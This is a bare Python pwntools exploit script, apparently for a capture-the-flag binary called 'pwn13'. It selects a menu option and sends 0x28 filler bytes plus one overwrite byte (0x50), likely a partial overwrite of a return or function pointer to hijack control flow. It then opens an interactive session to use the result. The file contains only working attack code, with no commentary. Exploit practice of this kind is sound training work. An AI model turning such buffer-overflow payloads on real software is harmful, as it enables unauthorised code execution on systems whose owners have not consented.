from pwn import *
a=process('./pwn13')
a.recvuntil("your choice:")
a.sendline("1")
payload='A'*0x28+'\x50'
a.recvuntil("input massage\n")
a.send(payload)
a.interactive()
